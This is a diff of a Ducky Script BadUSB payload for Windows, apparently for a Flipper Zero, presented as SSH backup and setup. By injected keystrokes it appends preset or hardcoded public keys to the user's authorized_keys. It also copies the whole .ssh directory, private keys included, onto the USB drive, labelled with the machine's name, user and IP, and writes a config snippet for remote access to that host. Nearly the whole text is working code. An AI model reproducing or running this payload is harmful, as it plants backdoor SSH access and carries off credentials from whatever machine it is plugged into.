@@ -1,51 +1,94 @@
-REM BadUSB script for Windows - Secure SSH Key Setup & Configuration
-
+REM BadUSB script for Windows - Backup and Configure SSH (User-level only) with Visual Feedback
 DELAY 1000
+REM Open the Run dialog
 GUI r
 DELAY 500
-STRING powershell
-DELAY 500
+STRING powershell -NoExit
 ENTER
 DELAY 1000
 
-REM Ensure SSH directory exists
-STRING if (!(Test-Path "$env:USERPROFILE\.ssh")) { mkdir "$env:USERPROFILE\.ssh" }
+REM Define a feedback function for colored output in PowerShell
+STRING function feedback($exitCode, $message) {
 ENTER
-STRING icacls "$env:USERPROFILE\.ssh" /grant "$env:USERNAME:F"
+STRING     if ($exitCode -eq 0) {
 ENTER
-
-REM Backup SSH configuration
-STRING Copy-Item -Recurse -Path "$env:USERPROFILE\.ssh" -Destination "$env:USERPROFILE\Documents\ssh_backup"
+STRING         Write-Host "[✅] $message succeeded." -ForegroundColor Green
 ENTER
-
-REM Pull authorized keys from the key manager JSON
-STRING $Keys = Get-Content "E:\keys.json" | ConvertFrom-Json
+STRING     } else {
 ENTER
-STRING foreach ($Key in $Keys.authorized_keys) { Add-Content -Path "$env:USERPROFILE\.ssh\authorized_keys" -Value $Key }
+STRING         Write-Host "[❌] $message failed." -ForegroundColor Red
 ENTER
-
-REM Get IP Address and Device Name
-STRING $DeviceName = $env:COMPUTERNAME
+STRING     }
 ENTER
-STRING $DeviceIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress
+STRING }
 ENTER
 
-REM Maintain structured SSH config
-STRING $ConfigContent = @"
+REM Ensure the .ssh directory exists in the user profile (C:\Users\Username\.ssh)
+STRING New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\.ssh"
+ENTER
+STRING if ($?) { feedback 0 "Created .ssh directory" } else { feedback 1 "Created .ssh directory" }
+ENTER
+
+REM Make an initial backup of the .ssh directory to Documents\ssh_backup
+STRING Copy-Item -Recurse -Force "$env:USERPROFILE\.ssh" "$env:USERPROFILE\Documents\ssh_backup" -ErrorAction SilentlyContinue
+ENTER
+STRING if ($?) { feedback 0 "Initial backup of .ssh directory" } else { feedback 1 "Initial backup of .ssh directory" }
+ENTER
+
+REM Update authorized_keys: if F:\keys.json exists, use its keys; otherwise, add hardcoded keys
+STRING if (Test-Path "F:\keys.json") {
+ENTER
+STRING     $json = Get-Content "F:\keys.json" | ConvertFrom-Json
+ENTER
+STRING     foreach ($key in $json.authorized_keys) {
+ENTER
+STRING         Add-Content "$env:USERPROFILE\.ssh\authorized_keys" $key
+ENTER
+STRING     }
+ENTER
+STRING     if ($?) { feedback 0 "Keys added from keys.json" } else { feedback 1 "Keys added from keys.json" }
+ENTER
+STRING } else {
+ENTER
+STRING     Add-Content "$env:USERPROFILE\.ssh\authorized_keys" "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTvOFuOTrCPUTI+tBcGTffpPrJbdOLkr6Ln7CN3IZFvUyYmWpmWpmuel9Ni5E4XBH6JKnF9g9BAmj7Tah2VVS+Q6g="
+ENTER
+STRING     Add-Content "$env:USERPROFILE\.ssh\authorized_keys" "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx9TpZQjYCJCwLqHDih0uycGvUIFMyvb/zJG1jgXohfrb7jE9ke4Qa/U7cavBOhbBVlKTwZURbQUs0auQSP8gbKv5nEraMgo9Bn4MchxsEK65DFkd8jmZbjqVn1Hs1vwOfT3KJTxfDRtRWamU0zNjjcWgRqPN++vaMvpPKO4UxI4680j/t6yfOiaRtRU5ESGvbobYLjqiDOSGdMZI1gk9LzF1wURbxdwQu/QD/PkAy8vHpZniWG1gutP1MV+/6p0MIbUSPeGwel7eqDKqaPdnIKT5RAhhz5ekkDfVBKFnj76EnQlY8li+/8RcNvKCNaFKH1THyd1gTw7ZZJzFM338B"
+ENTER
+STRING     if ($?) { feedback 0 "Hardcoded keys added to authorized_keys" } else { feedback 1 "Hardcoded keys added to authorized_keys" }
+ENTER
+STRING }
+ENTER
+
+REM Set permissions on the authorized_keys file using icacls (granting full control only to the current user)
+STRING icacls "$env:USERPROFILE\.ssh\authorized_keys" /inheritance:r /grant:r "$env:USERNAME:F"
+ENTER
+STRING if ($?) { feedback 0 "Permissions set for authorized_keys" } else { feedback 1 "Permissions set for authorized_keys" }
+ENTER
+
+REM Create or update the SSH config file if it does not exist
+STRING if (-Not (Test-Path "$env:USERPROFILE\.ssh\config")) {
+ENTER
+STRING     New-Item -ItemType File -Force -Path "$env:USERPROFILE\.ssh\config" | Out-Null
+ENTER
+STRING     @"
 ENTER
 STRING # SSH Configuration File
 ENTER
 STRING Host *
 ENTER
+STRING     PKCS11Provider "C:\Program Files\OpenSC\OpenSC-pkcs11.dll"
+ENTER
 STRING     ForwardAgent no
+ENTER
+STRING     ForwardX11 no
 ENTER
 STRING     PasswordAuthentication no
 ENTER
 STRING     ChallengeResponseAuthentication no
 ENTER
-STRING     IdentityFile ~/.ssh/id_ecdsa_sk
+STRING     IdentityFile $env:USERPROFILE\.ssh\id_ecdsa_sk
 ENTER
-STRING     IdentityFile ~/.ssh/id_ecdsa_sk_rk
+STRING     IdentityFile $env:USERPROFILE\.ssh\id_ecdsa_sk_rk
 ENTER
 STRING     IdentitiesOnly no
 ENTER
@@ -53,13 +96,17 @@ STRING     KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-h
 ENTER
 STRING     Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com
 ENTER
+STRING     HostKeyAlgorithms rsa-sha2-512,rsa-sha2-256,ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521
+ENTER
 STRING     ServerAliveInterval 60
 ENTER
 STRING     ServerAliveCountMax 3
 ENTER
+STRING     Compression no
+ENTER
 STRING     StrictHostKeyChecking ask
 ENTER
-STRING     UserKnownHostsFile ~/.ssh/known_hosts
+STRING     UserKnownHostsFile $env:USERPROFILE\.ssh\known_hosts
 ENTER
 STRING     TCPKeepAlive no
 ENTER
@@ -69,19 +116,111 @@ STRING     RekeyLimit 1G 1h
 ENTER
 STRING     LogLevel VERBOSE
 ENTER
-STRING "@
+STRING     IdentityAgent "$env:USERPROFILE\AppData\Local\gnupg\S.gpg-agent.ssh"
 ENTER
-STRING $ConfigContent | Set-Content -Path "$env:USERPROFILE\.ssh\ssh_config"
+STRING "@ | Set-Content "$env:USERPROFILE\.ssh\config"
+ENTER
+STRING icacls "$env:USERPROFILE\.ssh\config" /inheritance:r /grant:r "$env:USERNAME:F"
+ENTER
+STRING if ($?) { feedback 0 "SSH config created/updated" } else { feedback 1 "SSH config created/updated" }
+ENTER
+STRING } else {
+ENTER
+STRING feedback 0 "SSH config file already exists"
+ENTER
+STRING }
 ENTER
 
-REM Secure the ssh_config
-STRING icacls "$env:USERPROFILE\.ssh\ssh_config" /inheritance:r /grant "$env:USERNAME:F"
+REM Fetch device details for naming the backup folder
+STRING $DEVICE_NAME = $env:COMPUTERNAME
+ENTER
+STRING if ($?) { feedback 0 "Fetched device name" } else { feedback 1 "Fetched device name" }
+ENTER
+STRING $DEVICE_IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.254*" -and $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1 -ExpandProperty IPAddress)
+ENTER
+STRING if ($?) { feedback 0 "Fetched device IP" } else { feedback 1 "Fetched device IP" }
+ENTER
+STRING $USER_NAME = $env:USERNAME
+ENTER
+STRING if ($?) { feedback 0 "Fetched username" } else { feedback 1 "Fetched username" }
 ENTER
 
-REM Save SSH keys and config to external storage
-STRING if (Test-Path "E:\") { Copy-Item -Recurse -Path "$env:USERPROFILE\.ssh" -Destination "E:\ssh_backup" }
+REM Construct a backup folder name based on device info
+STRING $BACKUP_NAME = "$DEVICE_NAME" + "_" + "$USER_NAME" + "_" + "$DEVICE_IP"
 ENTER
 
-REM Notify completion
-STRING Write-Output "SSH Setup Complete for $DeviceName with IP $DeviceIP"
+REM Backup the .ssh directory to either Flipper USB (F:\) or to internal storage (Documents\ssh_backup)
+STRING if (Test-Path "F:\") {
+ENTER
+STRING     New-Item -ItemType Directory -Force -Path "F:\ssh_backup\$BACKUP_NAME" | Out-Null
+ENTER
+STRING     if ($?) { feedback 0 "Flipper USB ssh_backup directory created" } else { feedback 1 "Flipper USB ssh_backup directory created" }
+ENTER
+STRING     Copy-Item -Recurse -Force "$env:USERPROFILE\.ssh" "F:\ssh_backup\$BACKUP_NAME\"
+ENTER
+STRING     if ($?) { feedback 0 "User SSH configuration backed up to Flipper USB as $BACKUP_NAME" } else { feedback 1 "User SSH configuration backup to Flipper USB failed" }
+ENTER
+STRING     $BACKUP_DEST = "F:\ssh_backup\$BACKUP_NAME"
+ENTER
+STRING } else {
+ENTER
+STRING     Write-Host "Flipper USB not detected. Using internal storage for backup."
+ENTER
+STRING     New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\Documents\ssh_backup\$BACKUP_NAME" | Out-Null
+ENTER
+STRING     if ($?) { feedback 0 "Internal ssh_backup directory created" } else { feedback 1 "Internal ssh_backup directory created" }
+ENTER
+STRING     Copy-Item -Recurse -Force "$env:USERPROFILE\.ssh" "$env:USERPROFILE\Documents\ssh_backup\$BACKUP_NAME\"
+ENTER
+STRING     if ($?) { feedback 0 "User SSH configuration backed up to internal storage as $BACKUP_NAME" } else { feedback 1 "User SSH configuration backup to internal storage failed" }
+ENTER
+STRING     $BACKUP_DEST = "$env:USERPROFILE\Documents\ssh_backup\$BACKUP_NAME"
+ENTER
+STRING }
+ENTER
+
+REM Verify that the SSH config file was backed up correctly using SHA-256
+STRING if (Test-Path "$env:USERPROFILE\.ssh\config") {
+ENTER
+STRING     $ORIGINAL_HASH = (Get-FileHash -Algorithm SHA256 "$env:USERPROFILE\.ssh\config").Hash
+ENTER
+STRING     if (Test-Path "$BACKUP_DEST\config") {
+ENTER
+STRING         $BACKUP_HASH = (Get-FileHash -Algorithm SHA256 "$BACKUP_DEST\config").Hash
+ENTER
+STRING         if ($ORIGINAL_HASH -eq $BACKUP_HASH) {
+ENTER
+STRING             feedback 0 "SSH config backup verified successfully"
+ENTER
+STRING         } else {
+ENTER
+STRING             feedback 1 "SSH config backup verification failed"
+ENTER
+STRING         }
+ENTER
+STRING     } else {
+ENTER
+STRING         feedback 1 "SSH config backup file not found in backup destination"
+ENTER
+STRING     }
+ENTER
+STRING } else {
+ENTER
+STRING     feedback 1 "Original SSH config file not found"
+ENTER
+STRING }
+ENTER
+
+REM (Optional) Pause before proceeding (if administrator privileges are needed)
+STRING Read-Host "Press Enter to continue (if admin is required, please run as Administrator)"
+ENTER
+
+REM Create an extracted SSH config snippet for remote access and save it to the backup destination
+STRING "Host $($DEVICE_NAME)_$($USER_NAME)`n    HostName $DEVICE_IP`n    User $USER_NAME" | Set-Content "$BACKUP_DEST\extracted_ssh_config"
+ENTER
+STRING if ($?) { feedback 0 "Extracted SSH config file created for remote access" } else { feedback 1 "Extracted SSH config file creation failed" }
+ENTER
+
+REM Notify final completion to the user
+STRING Write-Host "[✅] SSH Setup Complete for $DEVICE_NAME with IP $DEVICE_IP" -ForegroundColor Green
 ENTER
